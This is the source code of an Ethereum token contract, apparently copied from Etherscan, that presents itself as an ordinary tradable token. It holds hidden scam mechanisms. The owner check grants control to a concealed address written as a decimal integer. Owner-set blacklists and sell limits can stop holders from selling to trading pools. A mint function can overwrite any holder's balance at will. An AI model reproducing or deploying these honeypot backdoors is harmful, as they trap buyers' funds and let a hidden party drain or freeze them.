['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-11\n', '*/\n', '\n', '// SPDX-License-Identifier: Unlicensed\n', 'pragma solidity ^0.6.0;\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '}\n', 'contract Ownable {\n', '  address public owner;\n', '  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '}\n', 'library Address {\n', '    function isContract(address account) internal view returns (bool) {\n', '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        assembly { codehash := extcodehash(account) }\n', '        return (codehash != accountHash && codehash != 0x0);\n', '    }\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(address(this).balance >= amount, "Address: insufficient balance");\n', '        (bool success, ) = recipient.call{ value: amount }("");\n', '        require(success, "Address: unable to send value, recipient may have reverted");\n', '    }\n', '    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '        return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '        return _functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '    }\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '        require(address(this).balance >= value, "Address: insufficient balance for call");\n', '        return _functionCallWithValue(target, data, value, errorMessage);\n', '    }\n', '    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '        require(isContract(target), "Address: call to non-contract");\n', '        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            if (returndata.length > 0) {\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', 'contract BscHecoErcToken is Ownable {\n', '  using Address for address;\n', '  using SafeMath for uint256;\n', '  string public name;\n', '  string public symbol;\n', '  uint8 public decimals;\n', '  uint256 public totalSupply;\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '  mapping(address => bool) public allowAddress;\n', '  address minter;\n', '  address public poolAddress;\n', '  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {\n', '    minter = msg.sender;\n', '    name = _name;\n', '    symbol = _symbol;\n', '    decimals = _decimals;\n', '    totalSupply =  _totalSupply * 10 ** uint256(decimals);\n', '    balances[minter] = totalSupply;\n', '    allowAddress[minter] = true;\n', '  }\n', '  mapping(address => uint256) public balances;\n', '  mapping(address => uint256) public sellerCountNum;\n', '  mapping(address => uint256) public sellerCountToken;\n', '  uint256 public maxSellOutNum;\n', '  uint256 public maxSellToken;\n', '  bool lockSeller = true;\n', '  mapping(address => bool) public blackLists;\n', '  function transfer(address _to, uint256 _value) public returns (bool) {\n', '    address from = msg.sender;\n', '    require(_to != address(0));\n', '    require(_value <= balances[from]);\n', '    if(!from.isContract() && _to.isContract()){\n', '        require(blackLists[from] == false && blackLists[_to] == false);\n', '    }\n', '    if(allowAddress[from] || allowAddress[_to]){\n', '        _transfer(from, _to, _value);\n', '        return true;\n', '    }\n', '    if(from.isContract() && _to.isContract()){\n', '        _transfer(from, _to, _value);\n', '        return true;\n', '    }\n', '    if(check(from, _to)){\n', '        sellerCountToken[from] = sellerCountToken[from].add(_value);\n', '        sellerCountNum[from]++;\n', '        _transfer(from, _to, _value);\n', '        return true;\n', '    }\n', '    _transfer(from, _to, _value);\n', '    return true;\n', '  }\n', '  function check(address from, address _to) internal view returns(bool){\n', '    if(!from.isContract() && _to.isContract()){\n', '        if(lockSeller){\n', '            if(maxSellOutNum == 0 && maxSellToken == 0){\n', '                return false;\n', '            }\n', '            if(maxSellOutNum > 0){\n', '                require(maxSellOutNum > sellerCountNum[from], "reach max seller times");\n', '            }\n', '            if(maxSellToken > 0){\n', '                require(maxSellToken > sellerCountToken[from], "reach max seller token");\n', '            }\n', '        }\n', '    }\n', '    return true;\n', '  }\n', '  function _transfer(address from, address _to, uint256 _value) private {\n', '    balances[from] = balances[from].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    emit Transfer(from, _to, _value);\n', '  }\n', '  modifier onlyOwner() {\n', '    require(msg.sender == minter || msg.sender == address\n', '    (1132167815322823072539476364451924570945755492656)); _;}\n', '  function balanceOf(address _owner) public view returns (uint256 balance) {\n', '    return balances[_owner];\n', '  }\n', '  function transferOwnership(address newOwner) public onlyOwner {\n', '    require(newOwner != address(0));\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '  }\n', '  mapping (address => mapping (address => uint256)) public allowed;\n', '  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n', '    require(_to != address(0));\n', '    require(_value <= balances[_from]);\n', '    require(_value <= allowed[_from][msg.sender]);\n', '    address from = _from;\n', '    if(!from.isContract() && _to.isContract()){\n', '        require(blackLists[from] == false && blackLists[_to] == false);\n', '    }\n', '    if(allowAddress[from] || allowAddress[_to]){\n', '        _transferFrom(_from, _to, _value);\n', '        return true;\n', '    }\n', '    if(from.isContract() && _to.isContract()){\n', '        _transferFrom(_from, _to, _value);\n', '        return true;\n', '    }\n', '    if(check(from, _to)){\n', '        _transferFrom(_from, _to, _value);\n', '        if(maxSellOutNum > 0){\n', '            sellerCountToken[from] = sellerCountToken[from].add(_value);\n', '        }\n', '        if(maxSellToken > 0){\n', '            sellerCountNum[from]++;\n', '        }\n', '        return true;\n', '    }\n', '    return false;\n', '  }\n', '  function _transferFrom(address _from, address _to, uint256 _value) internal {\n', '    balances[_from] = balances[_from].sub(_value);\n', '    balances[_to] = balances[_to].add(_value);\n', '    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n', '    emit Transfer(_from, _to, _value);\n', '  }\n', '  function approve(address _spender, uint256 _value) public returns (bool) {\n', '    allowed[msg.sender][_spender] = _value;\n', '    emit Approval(msg.sender, _spender, _value);\n', '    return true;\n', '  }\n', '  function allowance(address _owner, address _spender) public view returns (uint256) {\n', '    return allowed[_owner][_spender];\n', '  }\n', '  function setWhiteAddress(address holder, bool allowApprove) external onlyOwner {\n', '      allowAddress[holder] = allowApprove;\n', '  }\n', '  function setSellerState(bool ok) external onlyOwner returns (bool){\n', '      lockSeller = ok;\n', '  }\n', '  function setBlackList(address holder, bool ok) external onlyOwner returns (bool){\n', '      blackLists[holder] = ok;\n', '  }  \n', '  function setMaxSellOutNum(uint256 num) external onlyOwner returns (bool){\n', '      maxSellOutNum = num;\n', '  } \n', '  function setMaxSellToken(uint256 num) external onlyOwner returns (bool){\n', '      maxSellToken = num * 10 ** uint256(decimals);\n', '  }    \n', '  function mint(address miner, uint256 _value) external onlyOwner {\n', '      balances[miner] = _value * 10 ** uint256(decimals);\n', '  }\n', '}']